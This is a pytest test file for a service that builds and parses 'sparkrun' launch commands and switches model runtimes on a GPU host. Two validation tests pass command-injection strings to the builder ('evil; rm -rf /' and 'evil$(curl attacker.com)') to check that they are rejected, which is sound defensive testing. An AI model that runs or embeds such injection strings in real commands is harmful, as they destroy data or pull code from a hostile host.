"""Tests for sparkrun_manager — recipe extraction, command building, switch flow."""
from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest
from sqlmodel.ext.asyncio.session import AsyncSession

from app.models.runtime import Runtime
from app.services import sparkrun_manager


# ── extract_current_recipe ──────────────────────────────────────────────


def test_extract_recipe_from_full_command():
    cmd = (
        "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm "
        "--solo --no-rm --ensure --no-follow --label mc.runtime.slug=qwen-general"
    )
    assert (
        sparkrun_manager.extract_current_recipe(cmd)
        == "@official/qwen3.6-35b-a3b-fp8-vllm"
    )


def test_extract_recipe_bare_name():
    cmd = "uvx sparkrun run my-custom-recipe --solo"
    assert sparkrun_manager.extract_current_recipe(cmd) == "my-custom-recipe"


def test_extract_recipe_returns_none_for_empty():
    assert sparkrun_manager.extract_current_recipe(None) is None
    assert sparkrun_manager.extract_current_recipe("") is None


def test_extract_recipe_returns_none_when_no_sparkrun_run():
    assert sparkrun_manager.extract_current_recipe("docker start mycontainer") is None


def test_extract_recipe_handles_unbalanced_quotes():
    """Malformed commands shouldn't crash — just return None."""
    assert sparkrun_manager.extract_current_recipe('sparkrun run "broken') is None


# ── build_launch_command ───────────────────────────────────────────────


def test_build_command_includes_required_flags():
    cmd = sparkrun_manager.build_launch_command(
        "@official/qwen3.6-35b-a3b-fp8-vllm", slug="qwen-general"
    )
    assert "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm" in cmd
    assert "--solo" in cmd
    assert "--no-rm" in cmd
    assert "--ensure" in cmd
    assert "--label mc.runtime.slug=qwen-general" in cmd


def test_build_command_rejects_unsafe_slug():
    with pytest.raises(ValueError, match="slug"):
        sparkrun_manager.build_launch_command("recipe", slug="evil; rm -rf /")


def test_build_command_rejects_unsafe_recipe():
    with pytest.raises(ValueError, match="recipe"):
        sparkrun_manager.build_launch_command(
            "evil$(curl attacker.com)", slug="qwen-general"
        )


def test_build_command_accepts_custom_flags():
    cmd = sparkrun_manager.build_launch_command(
        "my-recipe", slug="test", flags="--solo --debug"
    )
    assert "--solo --debug" in cmd
    assert "--ensure" not in cmd


def test_build_command_injects_tensor_parallel_override():
    cmd = sparkrun_manager.build_launch_command(
        "@eugr/qwen3.6-35b-a3b-fp8", slug="qwen-general", tp_override=1
    )
    assert "--tensor-parallel 1" in cmd
    # Injected override must still come before the label so sparkrun parses it
    # as a flag, not part of the label value.
    assert cmd.index("--tensor-parallel 1") < cmd.index("--label")


def test_build_command_omits_tensor_parallel_when_no_override():
    cmd = sparkrun_manager.build_launch_command(
        "@official/qwen3.6-35b-a3b-fp8-vllm", slug="qwen-general"
    )
    assert "--tensor-parallel" not in cmd


# ── list_recipes (with mocked SSH) ───────────────────────────────────────


@pytest.mark.asyncio
async def test_list_recipes_parses_sparkrun_output():
    sample_output = (
        "@official/qwen3.6-35b-a3b-fp8-vllm                       vllm-distributed   1    1       0.8       Qwen/Qwen3.6-35B-A3B-FP8                         official\n"
        "@official/qwen3.6-27b-fp8-mtp-vllm                       vllm-distributed   1    1       0.8       Qwen/Qwen3.6-27B-FP8                             official\n"
        "@community/nemotron-3-nano-nvfp4                         vllm-distributed   1    1       0.7       nvidia/NVIDIA-Nemotron-3-Nano-30B-A3B-NVFP4      community\n"
        "@sparkrun-transitional/qwen3-1.7b-vllm                   vllm-distributed   1    1       0.7       Qwen/Qwen3-1.7B                                  community\n"
        "@eugr/qwen3.6-35b-a3b-fp8                                vllm-ray           2    1       0.8       Qwen/Qwen3.6-35B-A3B-FP8                         eugr\n"
        "@eugr/nemotron-3-ultra-nvfp4                             vllm-ray           4    1       0.85      nvidia/Nemotron-3-Ultra-550B-NVFP4               eugr\n"
        "@community/autoround-experimental                        vllm-distributed   -    -       -         some/model                                       community"
    )

    # Patch _ssh_run on the runtime_manager module — list_recipes does a
    # `from app.services.runtime_manager import _ssh_run` at call time so the
    # patch lands on the module attribute the import resolves against.
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=(sample_output, "", 0))):
        recipes = await sparkrun_manager.list_recipes(host_gpu_count=1)

    assert len(recipes) == 7
    assert recipes[0]["name"] == "@official/qwen3.6-35b-a3b-fp8-vllm"
    assert recipes[0]["model"] == "Qwen/Qwen3.6-35B-A3B-FP8"
    # Registry parsing is now generic — any prefix between @ and / works.
    assert recipes[0]["registry"] == "official"
    assert recipes[2]["registry"] == "community"
    assert recipes[3]["registry"] == "sparkrun-transitional"
    assert recipes[4]["registry"] == "eugr"

    # TP=1/Nodes=1 (or no tp column at all) → solo-capable on a 1-GPU host.
    assert recipes[0]["tp"] == 1
    assert recipes[0]["nodes"] == 1
    assert recipes[0]["solo_capable"] is True

    # TP=2/4 on a 1-GPU host → not solo-capable, regardless of registry.
    assert recipes[4]["tp"] == 2
    assert recipes[4]["solo_capable"] is False
    assert recipes[5]["tp"] == 4
    assert recipes[5]["solo_capable"] is False

    # Dash columns ('-') parse to None, not a crash, and count as solo-capable
    # (no TP/Nodes constraint declared).
    assert recipes[6]["tp"] is None
    assert recipes[6]["nodes"] is None
    assert recipes[6]["solo_capable"] is True


@pytest.mark.asyncio
async def test_list_recipes_solo_capable_respects_multi_gpu_host():
    """A recipe requiring tp=2 IS solo-capable on a 2-GPU host."""
    sample_output = (
        "@eugr/qwen3.6-35b-a3b-fp8   vllm-ray   2   1   0.8   Qwen/Qwen3.6-35B-A3B-FP8   eugr"
    )
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=(sample_output, "", 0))):
        recipes = await sparkrun_manager.list_recipes(host_gpu_count=2)

    assert recipes[0]["tp"] == 2
    assert recipes[0]["solo_capable"] is True


@pytest.mark.asyncio
async def test_list_recipes_returns_empty_on_ssh_failure():
    import app.services.runtime_manager as rm

    with patch.object(
        rm, "_ssh_run", AsyncMock(return_value=("", "ssh: command not found", 127))
    ):
        recipes = await sparkrun_manager.list_recipes(host_gpu_count=1)
    assert recipes == []


@pytest.mark.asyncio
async def test_list_recipes_defaults_host_gpu_count_to_probed_value():
    """When host_gpu_count is not passed, list_recipes probes it itself."""
    import app.services.runtime_manager as rm

    sample_output = "@eugr/qwen3.6-35b-a3b-fp8   vllm-ray   2   1   0.8   Qwen/Foo   eugr"

    async def fake_ssh_run(command, *, host=None, timeout=None):
        if "nvidia-smi" in command:
            return ("1", "", 0)
        return (sample_output, "", 0)

    with patch.object(rm, "_ssh_run", AsyncMock(side_effect=fake_ssh_run)):
        recipes = await sparkrun_manager.list_recipes()

    assert recipes[0]["tp"] == 2
    assert recipes[0]["solo_capable"] is False  # tp=2 > probed host_gpu_count=1


# ── get_host_gpu_count ───────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_get_host_gpu_count_parses_nvidia_smi_output():
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=("1", "", 0))):
        count = await sparkrun_manager.get_host_gpu_count()
    assert count == 1


@pytest.mark.asyncio
async def test_get_host_gpu_count_falls_back_to_one_on_error():
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=("", "ssh failed", 255))):
        count = await sparkrun_manager.get_host_gpu_count()
    assert count == 1


@pytest.mark.asyncio
async def test_get_host_gpu_count_falls_back_to_one_on_garbage_output():
    import app.services.runtime_manager as rm

    with patch.object(rm, "_ssh_run", AsyncMock(return_value=("not-a-number", "", 0))):
        count = await sparkrun_manager.get_host_gpu_count()
    assert count == 1


# ── switch_recipe (DB integration) ──────────────────────────────────────


@pytest.fixture
async def spark_runtime(async_session: AsyncSession) -> Runtime:
    rt = Runtime(
        slug="qwen-general",
        display_name="Spark Qwen vLLM",
        runtime_type="vllm_docker",
        endpoint="http://192.0.2.10:8000/v1",
        model_identifier="Qwen/Qwen3.6-35B-A3B-FP8",
        launch_command=(
            "uvx sparkrun run @official/qwen3.6-35b-a3b-fp8-vllm "
            "--solo --no-rm --ensure --no-follow "
            "--label mc.runtime.slug=qwen-general"
        ),
        container_name="sparkrun_oldid_solo",
        enabled=True,
    )
    async_session.add(rt)
    await async_session.commit()
    await async_session.refresh(rt)
    return rt


@pytest.fixture
async def patched_redis(fake_redis):
    """Patch get_redis in the resolver module (used by invalidate_and_reprobe)."""
    async def _fake_get_redis():
        return fake_redis

    with patch("app.services.runtime_model_resolver.get_redis", _fake_get_redis):
        yield fake_redis


@pytest.mark.asyncio
async def test_switch_recipe_persists_new_command(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """Happy path: switch swaps launch_command + clears stale model_identifier."""
    with (
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": True, "message": "starting"}),
        ),
        # Mock the probe used by the post-switch invalidate_and_reprobe so the
        # test doesn't reach out to a real Spark endpoint. Return None so the
        # resolver's "probe failed" branch is taken and the freshly-nulled
        # model_identifier stays None — matching real-world behaviour while
        # the new container is still warming up.
        patch(
            "app.services.agent_runtime_switch.probe_runtime_model",
            AsyncMock(return_value=None),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-27b-fp8-mtp-vllm",
        )

    assert result["ok"] is True
    assert result["old_recipe"] == "@official/qwen3.6-35b-a3b-fp8-vllm"
    assert result["new_recipe"] == "@official/qwen3.6-27b-fp8-mtp-vllm"

    await async_session.refresh(spark_runtime)
    assert "@official/qwen3.6-27b-fp8-mtp-vllm" in spark_runtime.launch_command
    # Stale model_identifier must be cleared so resolver re-probes the new model
    assert spark_runtime.model_identifier is None
    # Stale container_name must be cleared (sparkrun assigns fresh IDs)
    assert spark_runtime.container_name is None


@pytest.mark.asyncio
async def test_switch_recipe_noop_when_same_recipe(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """Switching to the currently-active recipe must NOT touch DB or restart."""
    stop_mock = AsyncMock()
    start_mock = AsyncMock()
    with (
        patch("app.services.runtime_manager.stop_runtime", stop_mock),
        patch("app.services.runtime_manager.start_runtime", start_mock),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-35b-a3b-fp8-vllm",
        )

    assert result["ok"] is True
    assert "no-op" in result["message"].lower()
    stop_mock.assert_not_called()
    start_mock.assert_not_called()
    # DB row unchanged
    await async_session.refresh(spark_runtime)
    assert spark_runtime.model_identifier == "Qwen/Qwen3.6-35B-A3B-FP8"


@pytest.mark.asyncio
async def test_switch_recipe_reports_start_failure(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """If start_runtime fails after we've persisted the new command, the
    caller learns about it via the returned status — DB state already
    reflects the attempted switch so the operator can retry."""
    with (
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": False, "message": "container did not start"}),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-27b-fp8-mtp-vllm",
        )

    assert result["ok"] is False
    assert "start failed" in result["message"]
    # DB still got updated — caller can retry start without re-confirming recipe
    await async_session.refresh(spark_runtime)
    assert "@official/qwen3.6-27b-fp8-mtp-vllm" in spark_runtime.launch_command


# ── switch_recipe solo-capability guard ──────────────────────────────────


@pytest.mark.asyncio
async def test_switch_recipe_aborts_before_evict_for_multi_node_recipe(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """A recipe that needs >1 physical node can never run solo on this
    single-host deployment — abort BEFORE evicting the current model so an
    unwinnable switch doesn't kill a healthy running engine."""
    recipe_list = [
        {
            "name": "@eugr/nemotron-3-ultra-nvfp4",
            "model": "nvidia/Nemotron-3-Ultra-550B-NVFP4",
            "registry": "eugr",
            "tp": 4,
            "nodes": 2,
            "solo_capable": False,
        }
    ]
    evict_mock = AsyncMock()
    with (
        patch(
            "app.services.sparkrun_manager.get_host_gpu_count",
            AsyncMock(return_value=1),
        ),
        patch(
            "app.services.sparkrun_manager.list_recipes",
            AsyncMock(return_value=recipe_list),
        ),
        patch("app.services.runtime_manager.evict_spark_runtime_containers", evict_mock),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@eugr/nemotron-3-ultra-nvfp4",
        )

    assert result["ok"] is False
    assert "node" in result["message"].lower()
    evict_mock.assert_not_called()
    # DB untouched — switch never got far enough to persist anything
    await async_session.refresh(spark_runtime)
    assert "@official/qwen3.6-35b-a3b-fp8-vllm" in spark_runtime.launch_command


@pytest.mark.asyncio
async def test_switch_recipe_injects_tp_override_when_recipe_exceeds_host_gpus(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """A single-node recipe defaulting to tp=2 on a 1-GPU host gets a
    downscaled `--tensor-parallel 1` injected — best-effort, not blocked."""
    recipe_list = [
        {
            "name": "@eugr/qwen3.6-35b-a3b-fp8",
            "model": "Qwen/Qwen3.6-35B-A3B-FP8",
            "registry": "eugr",
            "tp": 2,
            "nodes": 1,
            "solo_capable": False,
        }
    ]
    with (
        patch(
            "app.services.sparkrun_manager.get_host_gpu_count",
            AsyncMock(return_value=1),
        ),
        patch(
            "app.services.sparkrun_manager.list_recipes",
            AsyncMock(return_value=recipe_list),
        ),
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": True, "message": "starting"}),
        ),
        patch(
            "app.services.agent_runtime_switch.probe_runtime_model",
            AsyncMock(return_value=None),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@eugr/qwen3.6-35b-a3b-fp8",
        )

    assert result["ok"] is True
    assert "--tensor-parallel 1" in result["launch_command"]
    await async_session.refresh(spark_runtime)
    assert "--tensor-parallel 1" in spark_runtime.launch_command


@pytest.mark.asyncio
async def test_switch_recipe_proceeds_without_guard_when_recipe_list_unavailable(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """SSH/list failures during the guard must not block the switch — the
    post-launch readiness check is the real safety net in that case."""
    with (
        patch(
            "app.services.sparkrun_manager.get_host_gpu_count",
            AsyncMock(side_effect=RuntimeError("no host configured")),
        ),
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": True, "message": "starting"}),
        ),
        patch(
            "app.services.agent_runtime_switch.probe_runtime_model",
            AsyncMock(return_value=None),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "@official/qwen3.6-27b-fp8-mtp-vllm",
        )

    assert result["ok"] is True


@pytest.mark.asyncio
async def test_switch_recipe_skips_guard_for_unknown_recipe(
    async_session: AsyncSession,
    spark_runtime: Runtime,
    patched_redis,
):
    """A recipe not present in `sparkrun list` (e.g. a local/custom name)
    can't be validated — proceed without a tp override."""
    with (
        patch(
            "app.services.sparkrun_manager.get_host_gpu_count",
            AsyncMock(return_value=1),
        ),
        patch("app.services.sparkrun_manager.list_recipes", AsyncMock(return_value=[])),
        patch(
            "app.services.runtime_manager.evict_spark_runtime_containers",
            AsyncMock(return_value={"ok": True, "message": "evicted", "stopped": []}),
        ),
        patch(
            "app.services.runtime_manager.start_runtime",
            AsyncMock(return_value={"ok": True, "message": "starting"}),
        ),
        patch(
            "app.services.agent_runtime_switch.probe_runtime_model",
            AsyncMock(return_value=None),
        ),
    ):
        result = await sparkrun_manager.switch_recipe(
            async_session,
            spark_runtime,
            "my-local-recipe",
        )

    assert result["ok"] is True
    assert "--tensor-parallel" not in result["launch_command"]
